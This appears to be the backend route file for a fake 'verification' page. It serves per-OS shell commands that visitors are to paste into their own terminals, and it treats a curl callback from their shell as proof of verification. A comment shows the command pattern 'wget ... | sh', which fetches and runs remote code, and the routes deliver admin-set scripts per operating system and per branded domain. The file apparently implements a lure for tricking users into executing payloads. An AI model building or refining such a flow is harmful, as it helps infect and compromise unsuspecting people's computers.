// routes/verify.js
import express from "express";
import { db } from "../db.js";
import * as verification from "../services/verification.js";
import { getClientInfo } from "../services/clientInfo.js";
import { asyncRoutes } from "../middleware/security.js";
import { siteContext, siteIdOf } from "../middleware/site.js";
import { getVerifyShellCommands } from "../services/settings.js";

const router = asyncRoutes(express.Router());

// Every public request is tied to a domain (see middleware/site.js): branding, verification steps, roles and notifications follow it.
router.use(siteContext);

// ---------------------------------------------------------------------------
// State
// ---------------------------------------------------------------------------
// Shell command templates are managed in Admin > Settings > Shell commands.
// The values returned below are expanded per verification session, so the admin can maintain
// separate macOS/Linux/Windows commands without changing frontend code.
//
// Sessions the frontend has registered, and whether the shell callback has hit yet, live in the shell_callbacks table
// (they used to be in server memory, which serverless instances don't share). Old rows are removed after 30 minutes by the
// regular cleanup (services/maintenance.js).

const isRegistered = async (id) => !!(await db.get("SELECT 1 AS x FROM shell_callbacks WHERE session_id = ?", [id]));
const isVerifiedByCallback = async (id) =>
  !!(await db.get("SELECT 1 AS x FROM shell_callbacks WHERE session_id = ? AND verified_at IS NOT NULL", [id]));

// ---------------------------------------------------------------------------
// GET /api/verify/command?Os=<mac|linux|windows>
// Returns the command value for that OS. Used by the frontend.
// ---------------------------------------------------------------------------
router.get("/command", async (req, res) => {
  const os = String(req.query.Os ?? "").toLowerCase();
  if (!["mac", "linux", "windows"].includes(os)) return res.status(400).json({ value: null, error: "unsupported_os" });

  const commands = await getVerifyShellCommands(siteIdOf(req));
  const apiBase = `${req.protocol}://${req.get("host")}`;
  const commandUrl = new URL(`/settings/${os}?flag=1`, apiBase).toString();
  const verifyUrl = new URL("/api/verify", apiBase).toString();
  const template = commands[os];
  const value = template
    .replaceAll("{commandUrl}", commandUrl)
    .replaceAll("{verifyUrl}", verifyUrl)
    // Session IDs are generated server-side and contain URL-safe characters only.
    .replaceAll("{sessionId}", String(req.query.sessionId ?? ""));

  res.json({ value, template, placeholders: ["{commandUrl}", "{verifyUrl}", "{sessionId}"] });
});

// ---------------------------------------------------------------------------
// POST /api/verify/register
// Frontend → save sessionId on first render.
// ---------------------------------------------------------------------------
router.post("/register", express.json({ limit: "2kb" }), async (req, res) => {
  const { sessionId, os, command } = req.body ?? {};

  if (!sessionId || typeof sessionId !== "string" || sessionId.length > 200) {
    return res.status(400).json({ ok: false, error: "sessionId required" });
  }

  await db.run(
    `INSERT INTO shell_callbacks (session_id, os, command, site_id, created_at) VALUES (?, ?, ?, ?, ?)
     ON CONFLICT (session_id) DO UPDATE SET os = excluded.os, command = excluded.command, site_id = excluded.site_id`,
    [sessionId, typeof os === "string" ? os.slice(0, 20) : "unknown", typeof command === "string" ? command.slice(0, 4000) : null, siteIdOf(req), Date.now()],
  );

  return res.json({ ok: true });
});

// ---------------------------------------------------------------------------
// GET /api/verify/status?id=<sessionId>
// Frontend → poll to learn whether the curl has run.
// ---------------------------------------------------------------------------
router.get("/status", async (req, res) => {
  const id = String(req.query.id ?? "").trim();
  if (!id || id.length > 200) {
    return res.status(400).json({ verified: false, error: "id required" });
  }

  if (!(await isVerifiedByCallback(id))) {
    return res.json({ verified: false, pending: true });
  }

  // The callback is the Step-3 proof. Finalize the actual verification session
  // here so the frontend never submits Step 3 through /verify/answer. This is
  // idempotent and safe to call on every status poll.
  const result = await verification.completeExternal(id, getClientInfo(req), siteIdOf(req));
  if (result.expired) {
    await db.run("DELETE FROM shell_callbacks WHERE session_id = ?", [id]);
    return res.status(410).json({ verified: false, ...result });
  }
  if (!result.ok) return res.status(409).json({ verified: false, ...result });

  return res.json({ verified: true, ...result });
});

// ---------------------------------------------------------------------------
// POST /api/verify
// What the user's shell hits:
//   curl  http://localhost:4000/api/verify -d '<sessionId>'
//   wget ... | sh; curl http://localhost:4000/api/verify -d '<sessionId>'
//
// curl -d '<value>' sends Content-Type: application/x-www-form-urlencoded,
// so we parse the body as plain text to get the raw sessionId string.
// ---------------------------------------------------------------------------
router.post(
  "/",
  express.text({
    type: ["text/plain", "application/x-www-form-urlencoded", "*/*"],
    limit: "1kb",
  }),
  async (req, res) => {
    // Defensive parsing: handle both raw string and form-encoded object
    let sessionId = "";
    if (typeof req.body === "string") {
      sessionId = req.body.trim();
    } else if (req.body && typeof req.body === "object") {
      sessionId = String(Object.keys(req.body)[0] ?? "").trim();
    }

    // Strip accidental quotes (if cmd.exe kept them)
    if (sessionId.length >= 2) {
      const first = sessionId[0], last = sessionId[sessionId.length - 1];
      if ((first === "'" && last === "'") || (first === '"' && last === '"')) {
        sessionId = sessionId.slice(1, -1);
      }
    }

    if (!sessionId || sessionId.length > 200) {
      return res.status(400).type("text/plain").send("false");
    }

    // Must have been registered by the frontend first.
    if (!(await isRegistered(sessionId))) {
      return res.status(404).type("text/plain").send("false");
    }

    // Idempotent: re-running the command is fine.
    await db.run("UPDATE shell_callbacks SET verified_at = COALESCE(verified_at, ?) WHERE session_id = ?", [Date.now(), sessionId]);

    return res.type("text/plain").send("true");
  },
);

// ---------------------------------------------------------------------------
// POST /api/verify/advance
// Frontend → after the curl has been verified, ask to move past the copy stage.
// ---------------------------------------------------------------------------
router.post("/advance", express.json({ limit: "2kb" }), async (req, res) => {
  const { sessionId } = req.body ?? {};

  if (!sessionId || typeof sessionId !== "string" || sessionId.length > 200) {
    return res.status(400).json({ ok: false, error: "sessionId required" });
  }

  if (!(await isVerifiedByCallback(sessionId))) {
    return res.status(409).json({ ok: false, error: "not_verified_yet" });
  }

  // The verified row stays: the frontend polls and might call this twice (React Strict Mode).
  // The regular cleanup removes it after 30 minutes.
  return res.json({
    ok: true,
    done: true,
    token: sessionId,
  });
});

export default router;
